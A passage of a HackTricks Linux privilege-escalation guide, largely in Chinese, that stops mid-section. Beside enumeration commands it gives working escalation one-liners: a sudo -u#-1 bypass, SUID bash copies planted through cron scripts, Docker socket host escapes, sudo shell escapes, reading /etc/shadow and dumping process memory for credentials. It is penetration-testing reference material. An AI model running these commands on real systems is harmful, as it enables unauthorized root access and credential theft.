# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 系统信息

### OS info

让我们开始了解正在运行的 OS。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 路径

如果你**对 `PATH` 变量中任何文件夹具有写权限**，你可能能够劫持一些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

环境变量中有有趣的信息、密码或 API 密钥吗？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查 kernel 版本，查看是否存在可用于 escalate privileges 的 exploit。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到一个很好的易受攻击的内核列表以及一些已经 **compiled exploits**: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
其他可以找到一些 **compiled exploits** 的网站: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有易受攻击的内核版本，你可以执行：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可用于搜索内核漏洞利用的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (在受害主机上执行，仅检查针对内核 2.x 的漏洞利用)

始终 **在 Google 上搜索内核版本**，可能你的内核版本出现在某个内核漏洞利用中，这样你就可以确定该漏洞利用是有效的。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

基于出现在下列位置的易受攻击的 sudo 版本：
```bash
searchsploit sudo
```
你可以使用这个 grep 来检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **smasher2 box of HTB**，获取一个 **示例**，了解该 vuln 如何被利用
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 列举可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

如果你在 docker container 内部，你可以尝试从中逃逸：

{{#ref}}
docker-security/
{{#endref}}

## 驱动器

检查 **哪些已挂载或未挂载**、在哪里以及为什么。如果有任何未挂载的项，你可以尝试挂载它并检查是否包含私密信息
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

列举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
此外，检查**是否已安装任何编译器**。如果你需要使用某些 kernel exploit，这一点很有用，因为建议在你将要使用它的机器上（或在一台类似的机器上）对其进行编译。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查 **已安装的软件包和服务的版本**。也许存在某些旧版 Nagios（例如）可被利用来进行 escalating privileges…\
建议手动检查更可疑已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果你有对该机器的 SSH 访问权限，也可以使用 **openVAS** 来检查机器内安装的过时或存在漏洞的软件。

> [!NOTE] > _请注意，这些命令会显示大量大多无用的信息，因此建议使用 OpenVAS 或类似工具来检查已安装的软件版本是否易受已知漏洞利用的影响_

## Processes

查看正在执行的**哪些进程**，并检查是否有任何进程拥有**超出应有的权限**（例如 tomcat 由 root 执行？）
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### 进程监控

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### 进程内存

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示该进程的内存如何映射到其** 虚拟地址空间；它还显示了 **每个映射区域的权限**。**mem** 伪文件**暴露了进程的内存本身**。通过 **maps** 文件，我们可以知道哪些 **内存区域是可读的** 以及它们的偏移。我们使用这些信息去 **seek into the mem file and dump all readable regions** 到一个文件。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统的 **物理** 内存的访问，而不是虚拟内存。内核的虚拟地址空间可以通过 /dev/kmem 访问.\
通常，`/dev/mem` 仅对 **root** 和 **kmem** 组可读。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump 是对来自 Sysinternals 套件中经典 ProcDump 工具的 Linux 重新构想。可在 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要转储进程内存你可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除 root 要求并转储由你拥有的进程
- Script A.5 来自 [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (需要 root)

### 从进程内存获取凭证

#### 手动示例

如果你发现 authenticator 进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以 dump the process（参见前文章节以找到不同的方法来 dump the memory of a process）并在 memory 中搜索 credentials：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 会 **steal clear text credentials from memory** 并从一些 **well known files** 中窃取。它需要 root privileges 才能正常工作。

| 功能                                              | 进程名                |
| ------------------------------------------------- | -------------------- |
| GDM 密码 (Kali Desktop, Debian Desktop)           | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (活动 FTP 连接)                            | vsftpd               |
| Apache2 (活动 HTTP Basic Auth 会话)               | apache2              |
| OpenSSH (活动 SSH 会话 - Sudo 使用)               | sshd:                |

#### 搜索正则表达式/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 定时/Cron 作业

检查是否有任何定时作业易受攻击。也许你可以利用由 root 执行的脚本（wildcard vuln? 能否修改 root 使用的文件? 使用 symlinks? 在 root 使用的目录中创建特定文件?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 路径

例如，在 _/etc/crontab_ 中你可以看到 PATH：_PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_注意 "user" 用户对 /home/user 拥有写权限_)

如果在这个 crontab 中 root 用户尝试在未设置 PATH 的情况下执行某个命令或脚本。例如： _\* \* \* \* root overwrite.sh_\
然后，你可以使用以下方式获得 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用带通配符的脚本 (Wildcard Injection)

如果一个由 root 执行的脚本在命令中包含 “**\***”，你可以利用这一点做出意想不到的事情（例如 privesc）。示例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果 wildcard 前面跟着类似** _**/some/path/\***_ **的路径，则不易被利用（即使** _**./\***_ **也是如此）。**

阅读以下页面以获取更多 wildcard 利用技巧：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron 脚本覆盖与 symlink

如果你 **可以修改由 root 执行的 cron 脚本**，就可以非常容易地获得一个 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的脚本使用一个 **你拥有完全访问权限的目录**，那么删除该文件夹并 **创建一个 symlink 目录指向另一个由你控制的脚本** 可能会很有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Frequent cron jobs

你可以监控进程，查找那些每隔 1、2 或 5 分钟执行一次的进程。或许你可以利用它来 escalate privileges。

例如，要 **在 1 分钟内每 0.1s 监控**、**按最少执行的命令排序** 并删除执行次数最多的命令，你可以执行：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (它会监视并列出每个启动的进程)。

### 不可见的 cron jobs

可以通过在注释后放置一个 carriage return（不带 newline character）来创建一个 cronjob，使得该 cron job 会生效。示例（注意 carriage return 字符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写 _.service_ 文件

检查是否可以写入任何 `.service` 文件，如果可以，你**可以修改它**，使其**执行**你的**后门**，当服务**启动**、**重启**或**停止**时（也许你需要等待机器重启）。\
例如在 `.service` 文件中通过 **`ExecStart=/tmp/script.sh`** 创建你的后门

### 可写的服务二进制文件

请记住，如果你对**被服务执行的二进制文件拥有写权限**，你可以将它们替换为后门，这样当服务被重新执行时，后门就会被执行。

### systemd PATH - 相对路径

你可以使用以下命令查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现自己可以对路径中的任一文件夹进行**write**，你可能能够**escalate privileges**。你需要搜索像下面这样的文件中是否使用了**relative paths being used on service configurations**：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你有写权限的 systemd PATH 文件夹中创建一个 **executable**，其名称为 **与相对路径二进制文件同名**，当服务被要求执行易受攻击的操作（**Start**, **Stop**, **Reload**）时，你的 **backdoor 将被执行**（非特权用户通常无法启动/停止服务，但检查是否可以使用 `sudo -l`）。

**有关 services 的更多信息请参阅 `man systemd.service`.**

## **Timers**

**Timers** 是 systemd 单元文件，其名称以 `**.timer**` 结尾，用于控制 `**.service**` 文件或事件。**Timers** 可作为 cron 的替代方案，因为它们对日历时间事件和单调时间事件提供内置支持，并且可以异步运行。

你可以使用以下命令枚举所有 timers：
```bash
systemctl list-timers --all
```
### 可写的 timer 单元

如果你可以修改一个 timer，你可以让它执行 systemd.unit 的一些现有单元（例如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中你可以读到 Unit 是什么：

> 当此 timer 到期时要激活的 unit。参数是一个 unit 名称，其后缀不是 ".timer"。如果未指定，此值默认为一个与 timer 单元名称相同但后缀不同的 service。（见上文。）建议被激活的 unit 名称与 timer 单元的名称除了后缀外应一致。

因此，要滥用此权限，你需要：

- 找到某个 systemd unit（例如 `.service`），它正在 **执行一个可写的二进制文件**
- 找到某个 systemd unit 正在 **执行一个相对路径**，并且你对 **systemd PATH** 拥有 **可写权限**（以伪装该可执行文件）

**通过 `man systemd.timer` 了解有关定时器的更多信息。**

### **启用定时器**

要启用定时器，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意，**timer** 是通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 创建一个指向它的 symlink 来 **激活** 的。

## Sockets

Unix Domain Sockets (UDS) 在客户端-服务器模型中用于在同一台或不同机器之间实现 **进程间通信**。它们使用标准的 Unix 描述符文件进行主机间通信，并通过 `.socket` 文件进行配置。

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** 在该文件中，可以配置几个有趣的参数：

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 这些选项各不相同，但总体上用于 **指示将在哪监听**（AF_UNIX 套接字文件的路径、要监听的 IPv4/6 地址和/或端口号等）。
- `Accept`: 接受一个布尔参数。如果为 **true**，则会为每个传入连接启动一个 **service instance**，并且仅将该连接的 socket 传递给它。如果为 **false**，所有监听套接字本身会被 **传递给已启动的 service unit**，并且只为所有连接启动一个 service unit。对于 datagram sockets 和 FIFOs，此值被忽略，在这些场景下单个 service unit 无条件地处理所有传入流量。**默认值为 false**。出于性能原因，建议编写新的 daemon 时采用适用于 `Accept=no` 的方式。
- `ExecStartPre`, `ExecStartPost`: 接受一个或多个命令行，这些命令会在监听的 **sockets**/FIFOs 分别被 **创建** 并绑定之前或之后 **执行**。命令行的第一个 token 必须是一个绝对文件名，后面跟随该进程的参数。
- `ExecStopPre`, `ExecStopPost`: 额外的 **命令**，会在监听的 **sockets**/FIFOs 被 **关闭** 并移除之前或之后 **执行**。
- `Service`: 指定在 **incoming traffic** 时要 **激活** 的 **service** unit 名称。该设置仅允许用于 Accept=no 的 sockets。它默认指向与 socket 同名的 service（后缀被替换）。在大多数情况下，应该不需要使用此选项。

### Writable .socket files

如果你发现一个**可写**的 `.socket` 文件，你可以在 `[Socket]` 区段的开头添加类似 `ExecStartPre=/home/kali/sys/backdoor` 的条目，backdoor 会在 socket 被创建前执行。因此，你**可能需要等到机器重启**。\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

如果你**发现任何可写的 socket**（_此处指的是 Unix Sockets，而不是配置 `.socket` 文件_），则**可以与该 socket 通信**，并可能利用其中的漏洞。

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

请注意，可能存在一些 **sockets listening for HTTP** requests（_我不是在说 .socket 文件，而是作为 unix sockets 的文件_）。你可以通过以下命令检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
如果该 socket **响应 HTTP 请求**，那么你可以 **与其通信** 并可能 **利用一些漏洞**。

### 可写的 Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, 是一个需要保护的关键文件。默认情况下，它对 `root` 用户和 `docker` 组的成员可写。拥有对该 socket 的写权限可能导致权限提升。下面是如何利用这一点的说明，以及当 Docker CLI 不可用时的替代方法。

#### **使用 Docker CLI 提权**

如果你对 Docker socket 有写访问权限，你可以使用以下命令来提权：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个容器，从而以 root 级别访问宿主机的文件系统。

#### **Using Docker API Directly**

在 Docker CLI 不可用的情况下，仍然可以使用 Docker API 和 `curl` 命令操作 Docker socket。

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

设置好 `socat` 连接后，你可以在容器内直接执行命令，并以 root 权限访问宿主机的文件系统。

### 其他

注意，如果你对 docker socket 有写权限，因为你 **inside the group `docker`**，你有[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)。如果[**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下位置查看 **更多从 docker 逃逸或滥用它以提升权限的方法**：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

如果你发现可以使用 **`ctr`** 命令，请阅读下面的页面，因为 **you may be able to abuse it to escalate privileges**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

如果你发现可以使用 **`runc`** 命令，请阅读下面的页面，因为 **you may be able to abuse it to escalate privileges**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一个复杂的 **inter-Process Communication (IPC) system**，使应用程序能够高效地交互和共享数据。为现代 Linux 系统设计，它为不同形式的应用间通信提供了稳健的框架。

该系统用途广泛，支持基础的 IPC，增强进程间的数据交换，类似于 **enhanced UNIX domain sockets**。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，来自 Bluetooth 守护进程的来电信号可以促使音乐播放器静音，从而提升用户体验。此外，D-Bus 支持远程对象系统，简化服务请求和方法调用，使传统上复杂的进程更加简洁。

D-Bus 基于 **allow/deny model** 运行，根据匹配的策略规则的累积效果管理消息权限（方法调用、信号发送等）。这些策略指定了与 bus 的交互方式，可能通过利用这些权限导致权限提升。

下面提供了 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中此类策略的示例，详细说明了 root 用户拥有、发送到以及接收来自 `fi.w1.wpa_supplicant1` 的消息的权限。

未指定用户或组的策略适用于所有情况，而 "default" 上下文策略适用于未被其他特定策略覆盖的所有实体。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**在这里学习如何 enumerate 和 exploit D-Bus communication：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

通常对网络进行 enumerate 并确定机器在网络中的位置是很有趣的。

### 通用枚举
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 开放端口

始终检查在访问该机器之前，你无法与之交互的正在运行网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

检查是否可以 sniff traffic。如果可以，你可能能够抓取一些凭证。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查 **你是谁**、你拥有哪些 **权限**、系统中有哪些 **用户**、哪些可以 **登录** 以及哪些具有 **root 权限**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大 UID

某些 Linux 版本受到一个漏洞影响，允许 **UID > INT_MAX** 的用户升级权限。更多信息: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**利用它** 使用： **`systemd-run -t /bin/bash`**

### 组

检查你是否为可能授予你 root 权限的**某个组的成员**：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### 剪贴板

如果可能，检查剪贴板中是否有任何有趣的内容
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你**知道环境中的任何密码**，**尝试使用该密码以每个用户登录**。

### Su Brute

如果你不介意产生大量噪音，且目标计算机上存在 `su` 和 `timeout` 二进制文件，你可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数时也会尝试对用户进行 brute-force。

## 可写 PATH 滥用

### $PATH

如果你发现你可以**写入 $PATH 的某个文件夹**，你可能能够通过**在可写文件夹内创建 backdoor**（将名称设为某个会被其他用户（最好是 root）执行的命令）并且该命令**不会从位于你可写文件夹之前的文件夹加载**，来升级权限。

### SUDO and SUID

你可能被允许使用 sudo 执行某些命令，或者某些命令可能设置了 suid 位。使用以下命令检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
有些 **unexpected commands 允许你读取和/或写入文件，甚至执行命令。** 例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

sudo 配置可能允许用户在不知道密码的情况下以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个例子中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在通过将一个 ssh key 添加到 root 目录或通过调用 `sh` 来获取 shell 变得很容易。
```
sudo vim -c '!sh'
```
### SETENV

此指令允许用户在执行某些操作时 **设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
该示例，**基于 HTB machine Admirer**，**存在漏洞**，可通过 **PYTHONPATH hijacking** 在以 root 身份执行脚本时加载任意 python 库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo 执行路径绕过

**跳转** 去读取其他文件或使用 **symlinks**。例如在 sudoers 文件中： _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用 **wildcard** (\*), 就更容易：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**对策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary 未指定命令路径

如果将 **sudo permission** 授予单个命令 **未指定路径**：_hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
如果一个 **suid** 二进制文件 **executes another command without specifying the path to it (always check with** _**strings**_ **the content of a weird SUID binary)**，也可以使用该技术。

[Payload examples to execute.](payloads-to-execute.md)

### SUID 二进制带有命令路径

如果 **suid** 二进制 **executes another command specifying the path**，则可以尝试创建一个以该 suid 文件所调用命令命名并 **export a function**。

例如，如果一个 suid 二进制调用 _**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并导出它：
